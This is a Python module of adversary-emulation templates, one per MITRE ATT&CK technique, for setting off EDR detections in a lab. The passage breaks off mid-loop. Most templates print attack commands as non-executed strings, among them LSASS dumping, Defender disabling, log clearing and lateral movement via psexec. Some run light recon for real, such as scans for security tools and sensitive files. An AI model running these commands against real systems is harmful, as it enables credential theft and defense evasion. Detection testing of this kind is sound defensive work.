"""
Emulation Library - Safe simulation code templates per MITRE ATT&CK technique.

All code here is designed exclusively for authorized lab demonstrations.
No real malicious actions are performed - only telemetry generation and
behavioral simulation to trigger CrowdStrike detections.
"""

from typing import Dict, Optional

# ─────────────────────────────────────────────────────────────────
#  Template structure per TTP:
#    "TxxXX": {
#        "name": "Technique name",
#        "tactic": "MITRE tactic",
#        "windows": "<powershell code>",
#        "linux": "<python/bash code>",
#        "detection_notes": "What CrowdStrike detects",
#    }
# ─────────────────────────────────────────────────────────────────

EMULATION_LIBRARY: Dict[str, Dict] = {

    # ── INITIAL ACCESS ────────────────────────────────────────────

    "T1566": {
        "name": "Phishing",
        "tactic": "Initial Access",
        "windows": """\
# [SIMULATION] T1566 - Phishing Email Initial Access
# Safe simulation: mimics document-based phishing behavior
Write-Host "[SIMULATION] Spearphishing email received and opened" -ForegroundColor Yellow
Start-Sleep -Seconds 1

# Simulate WINWORD/Outlook spawning a child process
Write-Host "  ├─ Parent process: WINWORD.EXE"
Write-Host "  ├─ Child process: cmd.exe /c powershell.exe (simulated)"
Write-Host "  ├─ Simulating download cradle pattern..."
Start-Sleep -Seconds 1

# Safe: write a marker file to temp (easily cleaned up)
$markerPath = "$env:TEMP\\simulation_initial_access.txt"
"[SIMULATION] Phishing payload marker - $(Get-Date)" | Out-File $markerPath
Write-Host "  ├─ Marker file created: $markerPath"
Write-Host "  └─ [DETECTION POINT] CrowdStrike: Suspicious Office macro / script execution" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1566 - Phishing Initial Access
import os, time, tempfile

print("[SIMULATION] Phishing document executed")
time.sleep(1)
print("  ├─ Parent: browser/email client (simulated)")
print("  ├─ Child: sh -c python3 payload.py (simulated)")

marker = os.path.join(tempfile.gettempdir(), "simulation_initial_access.txt")
with open(marker, "w") as f:
    f.write("[SIMULATION] Phishing marker\\n")
print(f"  ├─ Marker written: {marker}")
print("  └─ [DETECTION POINT] Suspicious script spawned from mail client")
""",
        "detection_notes": "Process lineage (WINWORD.EXE→cmd.exe→powershell.exe), suspicious document macro execution, download cradle patterns.",
    },

    "T1566.001": {
        "name": "Spearphishing Attachment",
        "tactic": "Initial Access",
        "windows": """\
# [SIMULATION] T1566.001 - Spearphishing Attachment
Write-Host "[SIMULATION] Malicious attachment opened" -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "  ├─ File type: .docm (macro-enabled document)"
Write-Host "  ├─ Macro execution triggered"
Write-Host "  ├─ Simulating: powershell -enc <base64_payload> (safe - no real payload)"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'SIMULATION'"))
Write-Host "  ├─ Encoded command pattern detected (safe): $encoded"
Write-Host "  └─ [DETECTION POINT] Base64-encoded PowerShell from Office macro" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1566.001 - Spearphishing Attachment
import base64, time

print("[SIMULATION] Malicious attachment opened")
time.sleep(1)
safe_payload = base64.b64encode(b"[SIMULATION]").decode()
print(f"  ├─ Encoded payload pattern (safe): {safe_payload}")
print("  └─ [DETECTION POINT] Base64-encoded payload from document")
""",
        "detection_notes": "Base64-encoded commands launched from Office processes, macro execution events.",
    },

    "T1190": {
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "windows": """\
# [SIMULATION] T1190 - Exploit Public-Facing Application
Write-Host "[SIMULATION] Web application exploit simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "  ├─ Target: Web server / VPN appliance"
Write-Host "  ├─ Simulating anomalous HTTP request pattern..."
Write-Host "  ├─ w3wp.exe spawning cmd.exe (simulated)"
Write-Host "  ├─ Webshell activity pattern detected"
Write-Host "  └─ [DETECTION POINT] Web server spawning shell process" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1190 - Exploit Public-Facing Application
import time
print("[SIMULATION] Web exploit simulation")
time.sleep(1)
print("  ├─ Simulating webshell request pattern")
print("  ├─ HTTP POST with command injection (safe marker only)")
print("  └─ [DETECTION POINT] Suspicious web process execution")
""",
        "detection_notes": "Web server process spawning shells, anomalous HTTP request patterns, webshell signatures.",
    },

    # ── EXECUTION ─────────────────────────────────────────────────

    "T1059": {
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "windows": """\
# [SIMULATION] T1059 - Command and Scripting Interpreter
Write-Host "[SIMULATION] Scripting interpreter abuse" -ForegroundColor Yellow
Start-Sleep -Seconds 1

# Simulate suspicious PowerShell flags (safe)
Write-Host "  ├─ Pattern: powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass"
Write-Host "  ├─ Suspicious flags detected by CrowdStrike sensor"
Start-Sleep -Seconds 1
Write-Host "  ├─ Simulating obfuscated command pattern (safe, no execution):"
Write-Host "  │   $cmd = 'Invoke-' + 'Expression' (concatenation obfuscation)"
Write-Host "  └─ [DETECTION POINT] Suspicious PowerShell execution flags & obfuscation" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1059 - Scripting Interpreter Abuse
import subprocess, time

print("[SIMULATION] Scripting interpreter abuse")
time.sleep(1)
print("  ├─ Pattern: bash -c 'command' (simulated)")
print("  ├─ Suspicious shell flags detected")
# Safe: just list processes (harmless)
result = subprocess.run(["ps", "aux", "--no-headers"], capture_output=True, text=True)
proc_count = len(result.stdout.splitlines())
print(f"  ├─ Running processes enumerated: {proc_count}")
print("  └─ [DETECTION POINT] Suspicious interpreter invocation pattern")
""",
        "detection_notes": "Suspicious PowerShell flags (-EncodedCommand, -NoProfile, -ExecutionPolicy Bypass), obfuscation patterns, unusual parent-child process relationships.",
    },

    "T1059.001": {
        "name": "PowerShell",
        "tactic": "Execution",
        "windows": """\
# [SIMULATION] T1059.001 - PowerShell Abuse
Write-Host "[SIMULATION] Malicious PowerShell execution" -ForegroundColor Yellow
Start-Sleep -Seconds 1

# Simulate AMSI bypass pattern (detection trigger, safe)
Write-Host "  ├─ AMSI bypass attempt pattern simulated"
Write-Host "  ├─ Pattern: [Ref].Assembly.GetType(...) amsiInitFailed"
Write-Host "  ├─ Simulating in-memory execution (no real payload):"
$sb = [scriptblock]::Create("Write-Host '[SIMULATION] In-memory block executed'")
& $sb
Write-Host "  ├─ ScriptBlock logging triggered"
Write-Host "  └─ [DETECTION POINT] AMSI bypass attempt + suspicious ScriptBlock" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1059.001 - PowerShell (cross-platform pwsh)
import subprocess, time
print("[SIMULATION] PowerShell abuse simulation")
time.sleep(1)
print("  ├─ Executing pwsh with suspicious flags (safe)")
try:
    subprocess.run(["pwsh", "-NoProfile", "-Command",
                    "Write-Host '[SIMULATION] PowerShell payload'"],
                   timeout=5, capture_output=True)
    print("  ├─ pwsh available and executed")
except Exception:
    print("  ├─ pwsh not available (Linux), pattern simulated only")
print("  └─ [DETECTION POINT] PowerShell with suspicious flags")
""",
        "detection_notes": "AMSI bypass attempts, ScriptBlock logging events, PowerShell with -EncodedCommand or -NoProfile flags, in-memory execution.",
    },

    "T1059.003": {
        "name": "Windows Command Shell",
        "tactic": "Execution",
        "windows": """\
# [SIMULATION] T1059.003 - Windows Command Shell
Write-Host "[SIMULATION] cmd.exe abuse simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "  ├─ Simulating: cmd.exe /c 'command' pattern"
Write-Host "  ├─ Suspicious cmd invocation from non-interactive parent"
# Safe: run a harmless cmd
$output = cmd.exe /c "echo [SIMULATION] cmd executed" 2>&1
Write-Host "  ├─ Output: $output"
Write-Host "  └─ [DETECTION POINT] cmd.exe spawned from suspicious parent" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1059.003 - Command Shell Abuse (Linux equivalent)
import subprocess, time
print("[SIMULATION] Shell abuse simulation")
time.sleep(1)
r = subprocess.run(["sh", "-c", "echo '[SIMULATION] shell executed'"],
                   capture_output=True, text=True)
print(f"  ├─ Shell output: {r.stdout.strip()}")
print("  └─ [DETECTION POINT] Shell spawned with suspicious pattern")
""",
        "detection_notes": "cmd.exe spawned from Office, browsers, or service processes; suspicious command-line arguments.",
    },

    # ── PERSISTENCE ───────────────────────────────────────────────

    "T1547": {
        "name": "Boot or Logon Autostart Execution",
        "tactic": "Persistence",
        "windows": """\
# [SIMULATION] T1547 - Autostart Persistence
Write-Host "[SIMULATION] Persistence mechanism simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$simKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$simName = "SimulationPersistence"
$simValue = "powershell.exe -NoProfile -Command Write-Host SIMULATION"

Write-Host "  ├─ Target registry key: $simKey"
Write-Host "  ├─ Simulating registry write (dry-run - not executed):"
Write-Host "  │   Set-ItemProperty -Path '$simKey' -Name '$simName' -Value '$simValue'"
Write-Host "  ├─ [INFO] In real attack, this survives reboot"
Write-Host "  └─ [DETECTION POINT] Autorun registry key modification" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1547 - Autostart Persistence (Linux cron equivalent)
import time
print("[SIMULATION] Persistence simulation")
time.sleep(1)
print("  ├─ Simulating cron entry: @reboot /tmp/payload.sh")
print("  ├─ Simulating ~/.bashrc modification (not executed)")
print("  ├─ Target: /etc/cron.d/simulation (dry-run)")
print("  └─ [DETECTION POINT] Cron/autostart modification from non-root")
""",
        "detection_notes": "Registry Run key modifications, scheduled task creation, new services, startup folder writes.",
    },

    "T1053": {
        "name": "Scheduled Task/Job",
        "tactic": "Persistence",
        "windows": """\
# [SIMULATION] T1053 - Scheduled Task Persistence
Write-Host "[SIMULATION] Scheduled task creation simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$taskName = "SimulationTask_$(Get-Random)"
Write-Host "  ├─ Task name: $taskName"
Write-Host "  ├─ Simulating: schtasks /create /tn '$taskName' /tr payload.exe /sc onlogon"
Write-Host "  ├─ [INFO] Actual task NOT created - dry-run only"

# Safe: just query existing tasks to generate telemetry
$taskCount = (Get-ScheduledTask -ErrorAction SilentlyContinue | Measure-Object).Count
Write-Host "  ├─ Existing tasks on system: $taskCount"
Write-Host "  └─ [DETECTION POINT] Scheduled task creation via schtasks.exe" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1053.003 - Cron Job
import subprocess, time
print("[SIMULATION] Cron persistence simulation")
time.sleep(1)
# Safe: list current crontab (read-only)
r = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
print(f"  ├─ Current crontab entries: {len(r.stdout.splitlines())}")
print("  ├─ Simulating: (crontab -l; echo '@reboot /tmp/sim.sh') | crontab -")
print("  ├─ [INFO] Cron not modified - dry-run only")
print("  └─ [DETECTION POINT] Crontab modification attempt")
""",
        "detection_notes": "schtasks.exe spawning from unusual parents, new scheduled tasks, cron modifications.",
    },

    # ── PRIVILEGE ESCALATION ──────────────────────────────────────

    "T1068": {
        "name": "Exploitation for Privilege Escalation",
        "tactic": "Privilege Escalation",
        "windows": """\
# [SIMULATION] T1068 - Privilege Escalation Exploit
Write-Host "[SIMULATION] Privilege escalation simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = ([Security.Principal.WindowsPrincipal]$currentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "  ├─ Current user: $($currentUser.Name)"
Write-Host "  ├─ Is Admin: $isAdmin"
Write-Host "  ├─ Simulating token impersonation pattern (safe)"
Write-Host "  ├─ Pattern: CreateProcessWithTokenW (privilege escalation API)"
Write-Host "  └─ [DETECTION POINT] Suspicious privilege escalation API calls" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1068 - Privilege Escalation
import os, time
print("[SIMULATION] Privilege escalation simulation")
time.sleep(1)
print(f"  ├─ Current UID: {os.getuid()} / EUID: {os.geteuid()}")
print("  ├─ Simulating SUID binary abuse pattern")
print("  ├─ Target: find / -perm -4000 (SUID search pattern)")
print("  └─ [DETECTION POINT] SUID exploitation / sudo abuse attempt")
""",
        "detection_notes": "Suspicious API calls (CreateProcessWithTokenW, AdjustTokenPrivileges), token manipulation, SUID abuse on Linux.",
    },

    "T1078": {
        "name": "Valid Accounts",
        "tactic": "Privilege Escalation / Defense Evasion",
        "windows": """\
# [SIMULATION] T1078 - Valid Account Abuse
Write-Host "[SIMULATION] Valid account abuse simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

Write-Host "  ├─ Scenario: Attacker uses stolen credentials"
Write-Host "  ├─ Simulating: runas /user:DOMAIN\\admin cmd.exe"
Write-Host "  ├─ Unusual logon time / location pattern"
Write-Host "  ├─ Service account used interactively (anomalous)"

# Safe: query local groups
$admins = (net localgroup administrators 2>&1) | Where-Object { $_ -match '\\\\' -or $_ -match '@' }
Write-Host "  ├─ Local admin accounts: $($admins.Count)"
Write-Host "  └─ [DETECTION POINT] Unusual account usage / logon anomaly" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1078 - Valid Account Abuse
import subprocess, time
print("[SIMULATION] Valid account abuse simulation")
time.sleep(1)
r = subprocess.run(["who"], capture_output=True, text=True)
print(f"  ├─ Current sessions: {r.stdout.strip()}")
print("  ├─ Simulating: su - admin (credential reuse)")
print("  ├─ Unusual SSH login from foreign IP (simulated)")
print("  └─ [DETECTION POINT] Anomalous account usage / impossible travel")
""",
        "detection_notes": "Logon events with unusual hours, geographic anomalies, service accounts used interactively.",
    },

    # ── DEFENSE EVASION ───────────────────────────────────────────

    "T1562": {
        "name": "Impair Defenses",
        "tactic": "Defense Evasion",
        "windows": """\
# [SIMULATION] T1562 - Impair Defenses
Write-Host "[SIMULATION] Defense evasion simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

Write-Host "  ├─ Pattern: Attempting to disable Windows Defender (simulated)"
Write-Host "  ├─ Command: Set-MpPreference -DisableRealtimeMonitoring $true (NOT executed)"
Write-Host "  ├─ Pattern: net stop 'Windows Defender' (NOT executed)"
Write-Host "  ├─ Event log clearing attempt: wevtutil cl Security (NOT executed)"

# Safe: just query defender status
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus) {
    Write-Host "  ├─ Defender RealTimeProtection: $($defenderStatus.RealTimeProtectionEnabled)"
}
Write-Host "  └─ [DETECTION POINT] Defender tampering / log clearing attempt" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1562 - Impair Defenses
import subprocess, time
print("[SIMULATION] Defense evasion simulation")
time.sleep(1)
print("  ├─ Simulating: systemctl stop auditd (NOT executed)")
print("  ├─ Simulating: echo '' > /var/log/auth.log (NOT executed)")
print("  ├─ Simulating: iptables -F (NOT executed)")
r = subprocess.run(["systemctl", "status", "auditd"], capture_output=True, text=True)
status = "active" if "active (running)" in r.stdout else "inactive/unavailable"
print(f"  ├─ auditd status: {status}")
print("  └─ [DETECTION POINT] Security tool tampering / log manipulation")
""",
        "detection_notes": "Defender/AV tampering, event log clearing (wevtutil), audit policy modifications, security tool process terminations.",
    },

    "T1070": {
        "name": "Indicator Removal",
        "tactic": "Defense Evasion",
        "windows": """\
# [SIMULATION] T1070 - Indicator Removal
Write-Host "[SIMULATION] Indicator removal simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "  ├─ Pattern: wevtutil cl System (NOT executed)"
Write-Host "  ├─ Pattern: Clear-EventLog -LogName Security (NOT executed)"
Write-Host "  ├─ Pattern: del /f /q %TEMP%\\* (NOT executed)"
Write-Host "  ├─ Pattern: timestomp - modifying file timestamps"

# Safe: just check log sizes
$secLog = Get-WinEvent -ListLog Security -ErrorAction SilentlyContinue
if ($secLog) {
    Write-Host "  ├─ Security log size: $([math]::Round($secLog.FileSize/1MB, 2)) MB"
}
Write-Host "  └─ [DETECTION POINT] Event log clearing / artifact deletion" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1070 - Indicator Removal
import subprocess, time, os
print("[SIMULATION] Indicator removal simulation")
time.sleep(1)
print("  ├─ Simulating: history -c && unset HISTFILE (NOT executed)")
print("  ├─ Simulating: shred -u /var/log/auth.log (NOT executed)")
print("  ├─ Simulating: touch -d '2020-01-01' /tmp/payload (timestomp)")
size = os.path.getsize("/var/log/syslog") if os.path.exists("/var/log/syslog") else 0
print(f"  ├─ Syslog size: {size} bytes")
print("  └─ [DETECTION POINT] Log clearing / history manipulation")
""",
        "detection_notes": "Event log clearing, timestomping, history file manipulation, log file deletion.",
    },

    # ── CREDENTIAL ACCESS ─────────────────────────────────────────

    "T1003": {
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "windows": """\
# [SIMULATION] T1003 - Credential Dumping
Write-Host "[SIMULATION] Credential dumping simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

# Safe: locate LSASS without accessing its memory
$lsassProc = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsassProc) {
    Write-Host "  ├─ LSASS process identified (PID: $($lsassProc.Id))"
    Write-Host "  ├─ Simulating: MiniDumpWriteDump API call pattern"
    Write-Host "  ├─ Simulating: procdump.exe -ma lsass.exe lsass.dmp (NOT executed)"
    Write-Host "  ├─ Simulating: sekurlsa::logonpasswords (NOT executed)"
}
Start-Sleep -Seconds 1
Write-Host "  └─ [DETECTION POINT] LSASS memory access / credential dump tool" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1003 - Credential Dumping (Linux)
import subprocess, time, os
print("[SIMULATION] Credential access simulation")
time.sleep(1)
print("  ├─ Simulating: /etc/shadow read attempt")
print("  ├─ Simulating: cat /etc/passwd (safe - readable)")
r = subprocess.run(["wc", "-l", "/etc/passwd"], capture_output=True, text=True)
print(f"  ├─ /etc/passwd entries: {r.stdout.strip()}")
print("  ├─ Simulating: LaZagne credential extraction (NOT executed)")
print("  └─ [DETECTION POINT] Sensitive credential file access")
""",
        "detection_notes": "LSASS process access with PROCESS_VM_READ, procdump/mimikatz signatures, suspicious API calls (MiniDumpWriteDump), /etc/shadow access.",
    },

    "T1003.001": {
        "name": "LSASS Memory",
        "tactic": "Credential Access",
        "windows": """\
# [SIMULATION] T1003.001 - LSASS Memory Dumping
Write-Host "[SIMULATION] LSASS memory access attempt" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Host "  ├─ LSASS PID: $($lsass.Id)"
    Write-Host "  ├─ Memory: $([math]::Round($lsass.WorkingSet64/1MB, 1)) MB"
    Write-Host "  ├─ Simulating: OpenProcess(PROCESS_VM_READ, lsass.exe)"
    Write-Host "  ├─ Simulating: MiniDumpWriteDump -> C:\\Windows\\Temp\\lsass.dmp"
    Start-Sleep -Seconds 2
    Write-Host "  ├─ Dump file marker (safe): $env:TEMP\\sim_lsass_dump.txt"
    "[SIMULATION] LSASS dump marker - $(Get-Date)" | Out-File "$env:TEMP\\sim_lsass_dump.txt"
}
Write-Host "  └─ [DETECTION POINT] CRITICAL - LSASS memory dump attempt" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1003.001 - Memory Credential Access
import subprocess, time
print("[SIMULATION] LSASS equivalent memory access")
time.sleep(1)
# Safe: check process memory info
r = subprocess.run(["cat", "/proc/1/status"], capture_output=True, text=True)
lines = {l.split(':')[0]: l.split(':')[1].strip()
         for l in r.stdout.splitlines() if ':' in l}
print(f"  ├─ Init process VmRSS: {lines.get('VmRSS', 'N/A')}")
print("  ├─ Simulating: gcore <pid> (process memory dump - NOT executed)")
print("  └─ [DETECTION POINT] Process memory access for credential extraction")
""",
        "detection_notes": "CRITICAL detection: LSASS process memory access, suspicious OpenProcess calls, credential dump file creation, procdump/mimikatz/comsvcs.dll abuse.",
    },

    "T1555": {
        "name": "Credentials from Password Stores",
        "tactic": "Credential Access",
        "windows": """\
# [SIMULATION] T1555 - Password Store Access
Write-Host "[SIMULATION] Browser credential store access simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
$firefoxPath = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"

Write-Host "  ├─ Chrome Login Data: $(if (Test-Path $chromePath) { 'EXISTS' } else { 'not found' })"
Write-Host "  ├─ Firefox Profiles: $(if (Test-Path $firefoxPath) { 'EXISTS' } else { 'not found' })"
Write-Host "  ├─ Simulating: SQLite query on Login Data (NOT executed)"
Write-Host "  ├─ Simulating: DPAPI decryption of stored passwords"
Write-Host "  └─ [DETECTION POINT] Browser credential store access" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1555 - Password Store Access
import os, time
print("[SIMULATION] Credential store access simulation")
time.sleep(1)
chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
firefox_path = os.path.expanduser("~/.mozilla/firefox")
print(f"  ├─ Chrome Login Data: {'EXISTS' if os.path.exists(chrome_path) else 'not found'}")
print(f"  ├─ Firefox Profiles: {'EXISTS' if os.path.exists(firefox_path) else 'not found'}")
print("  ├─ Simulating: sqlite3 query on Login Data (NOT executed)")
print("  └─ [DETECTION POINT] Browser credential database access")
""",
        "detection_notes": "Access to browser SQLite credential databases, DPAPI decryption calls, keychain/credential manager queries.",
    },

    # ── DISCOVERY ─────────────────────────────────────────────────

    "T1083": {
        "name": "File and Directory Discovery",
        "tactic": "Discovery",
        "windows": """\
# [SIMULATION] T1083 - File and Directory Discovery
Write-Host "[SIMULATION] File/directory enumeration simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

Write-Host "  ├─ Enumerating sensitive directories..."
$targets = @("$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Desktop",
             "C:\\Users", "C:\\Program Files")
foreach ($t in $targets) {
    if (Test-Path $t) {
        $count = (Get-ChildItem $t -ErrorAction SilentlyContinue | Measure-Object).Count
        Write-Host "  │   $t : $count items"
    }
}
Write-Host "  ├─ Pattern matches: *.docx, *.xlsx, *.pdf, *.kdbx (simulated)"
Write-Host "  └─ [DETECTION POINT] Mass file enumeration / sensitive file search" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1083 - File and Directory Discovery
import os, time
print("[SIMULATION] File enumeration simulation")
time.sleep(1)
targets = [os.path.expanduser("~"), "/tmp", "/var/log"]
for t in targets:
    try:
        count = len(os.listdir(t))
        print(f"  ├─ {t}: {count} items")
    except PermissionError:
        print(f"  ├─ {t}: permission denied (as expected)")
print("  ├─ Simulating: find / -name '*.key' -o -name '*.pem' 2>/dev/null")
print("  └─ [DETECTION POINT] Recursive file enumeration / sensitive file search")
""",
        "detection_notes": "Mass file enumeration commands (dir /s, find /), searches for specific file types (.key, .pem, .docx), sensitive directory access.",
    },

    "T1018": {
        "name": "Remote System Discovery",
        "tactic": "Discovery",
        "windows": """\
# [SIMULATION] T1018 - Remote System Discovery (Network Reconnaissance)
Write-Host "[SIMULATION] Network reconnaissance simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

Write-Host "  ├─ Querying network neighborhood..."
$arp = arp -a 2>&1 | Select-Object -First 10
Write-Host "  ├─ ARP cache entries (first 10):"
$arp | ForEach-Object { Write-Host "  │   $_" }

Write-Host "  ├─ Simulating: netscan / nbtscan (NOT executed)"
Write-Host "  ├─ Simulating: net view / net group 'Domain Computers' (NOT executed)"
Write-Host "  └─ [DETECTION POINT] Network scanning / host discovery activity" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1018 - Remote System Discovery
import subprocess, time
print("[SIMULATION] Network reconnaissance simulation")
time.sleep(1)
# Safe: check ARP cache (read-only)
r = subprocess.run(["arp", "-n"], capture_output=True, text=True)
entries = [l for l in r.stdout.splitlines() if "." in l]
print(f"  ├─ ARP cache entries: {len(entries)}")
for e in entries[:5]:
    print(f"  │   {e.strip()}")
print("  ├─ Simulating: nmap -sn 10.0.0.0/24 (NOT executed)")
print("  └─ [DETECTION POINT] Host discovery / network scanning behavior")
""",
        "detection_notes": "Network scanning tools (nmap, netscan, nbtscan), ARP sweeps, LDAP queries for computer objects, ping sweeps.",
    },

    "T1057": {
        "name": "Process Discovery",
        "tactic": "Discovery",
        "windows": """\
# [SIMULATION] T1057 - Process Discovery
Write-Host "[SIMULATION] Process enumeration simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

Write-Host "  ├─ Running: tasklist (security tool detection)"
$secTools = @("MsMpEng", "CsFalconService", "CSFalconContainer", "Sysmon",
              "CrowdStrike", "cb", "CarbonBlack", "sentinel", "cortex")

$processes = Get-Process -ErrorAction SilentlyContinue
Write-Host "  ├─ Total processes: $($processes.Count)"
Write-Host "  ├─ Checking for security tools..."
foreach ($tool in $secTools) {
    $found = $processes | Where-Object { $_.Name -like "*$tool*" }
    if ($found) { Write-Host "  │   [!] Security tool found: $($found.Name)" }
}
Write-Host "  └─ [DETECTION POINT] Process enumeration for security tool detection" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1057 - Process Discovery
import subprocess, time
print("[SIMULATION] Process discovery simulation")
time.sleep(1)
r = subprocess.run(["ps", "aux", "--no-headers"], capture_output=True, text=True)
procs = r.stdout.splitlines()
print(f"  ├─ Running processes: {len(procs)}")
security_tools = ["falcon", "crowdstrike", "auditd", "sysmon", "osquery", "wazuh"]
for tool in security_tools:
    matches = [p for p in procs if tool.lower() in p.lower()]
    if matches:
        print(f"  │   [!] Security tool found: {tool}")
print("  └─ [DETECTION POINT] Mass process enumeration / security tool detection")
""",
        "detection_notes": "Rapid process enumeration, specific searches for security tool process names, tasklist/ps invocations.",
    },

    # ── LATERAL MOVEMENT ──────────────────────────────────────────

    "T1021": {
        "name": "Remote Services",
        "tactic": "Lateral Movement",
        "windows": """\
# [SIMULATION] T1021 - Lateral Movement via Remote Services
Write-Host "[SIMULATION] Lateral movement simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$targetIP = "192.168.1.100"  # Simulated target
Write-Host "  ├─ Target system: $targetIP (simulated)"
Write-Host "  ├─ Pattern: Invoke-Command -ComputerName $targetIP (NOT executed)"
Write-Host "  ├─ Pattern: psexec.exe \\\\$targetIP -u admin -p pass cmd.exe"
Write-Host "  ├─ Pattern: wmic /node:$targetIP process call create 'payload.exe'"
Write-Host "  ├─ Testing connectivity (safe):"
$ping = Test-Connection -ComputerName "8.8.8.8" -Count 1 -ErrorAction SilentlyContinue
Write-Host "  │   Connectivity test: $(if ($ping) { 'OK' } else { 'No response' })"
Write-Host "  └─ [DETECTION POINT] Remote execution / lateral movement pattern" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1021 - Remote Services
import subprocess, time
print("[SIMULATION] Lateral movement simulation")
time.sleep(1)
target = "192.168.1.100"  # Simulated target
print(f"  ├─ Target: {target} (simulated)")
print(f"  ├─ Pattern: ssh -i stolen.key user@{target} (NOT executed)")
print(f"  ├─ Pattern: scp malware.sh user@{target}:/tmp/ (NOT executed)")
r = subprocess.run(["ping", "-c", "1", "-W", "1", "127.0.0.1"],
                   capture_output=True, text=True)
print(f"  ├─ Localhost ping: {'OK' if r.returncode == 0 else 'fail'}")
print("  └─ [DETECTION POINT] Unusual SSH/SMB connections / lateral movement")
""",
        "detection_notes": "SMB/RDP connections between internal hosts, PsExec usage, WMI remote execution, unusual SSH key usage.",
    },

    "T1021.001": {
        "name": "Remote Desktop Protocol",
        "tactic": "Lateral Movement",
        "windows": """\
# [SIMULATION] T1021.001 - RDP Lateral Movement
Write-Host "[SIMULATION] RDP lateral movement simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "  ├─ Pattern: mstsc.exe /v:TARGET_IP (NOT executed)"
Write-Host "  ├─ Pattern: cmdkey /add:TARGET /user:admin /pass:P@ssw0rd"
Write-Host "  ├─ Checking RDP service status..."
$rdp = Get-Service -Name TermService -ErrorAction SilentlyContinue
Write-Host "  ├─ RDP Service (TermService): $($rdp.Status)"
Write-Host "  ├─ Simulating: RDP connection attempt with stolen credentials"
Write-Host "  └─ [DETECTION POINT] Anomalous RDP login / lateral movement" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1021.001 - RDP
import subprocess, time
print("[SIMULATION] RDP lateral movement simulation")
time.sleep(1)
print("  ├─ Pattern: xfreerdp /v:target /u:admin /p:pass (NOT executed)")
r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True)
rdp_listening = "3389" in r.stdout
print(f"  ├─ RDP port 3389: {'LISTENING' if rdp_listening else 'not found'}")
print("  └─ [DETECTION POINT] RDP connection with credential reuse")
""",
        "detection_notes": "Unusual RDP connections, cmdkey usage, RDP from non-admin systems, multiple failed RDP attempts.",
    },

    # ── COLLECTION ────────────────────────────────────────────────

    "T1005": {
        "name": "Data from Local System",
        "tactic": "Collection",
        "windows": """\
# [SIMULATION] T1005 - Data Collection from Local System
Write-Host "[SIMULATION] Data collection simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

Write-Host "  ├─ Searching for valuable data types..."
$searchPaths = @($env:USERPROFILE, "C:\\Users")
$extensions = @("*.docx", "*.xlsx", "*.pdf", "*.kdbx", "*.key", "*.pem")

foreach ($ext in $extensions) {
    $found = Get-ChildItem -Path $searchPaths -Filter $ext -Recurse -ErrorAction SilentlyContinue | Select-Object -First 3
    if ($found) { Write-Host "  │   Found $ext files: $($found.Count) (sample)" }
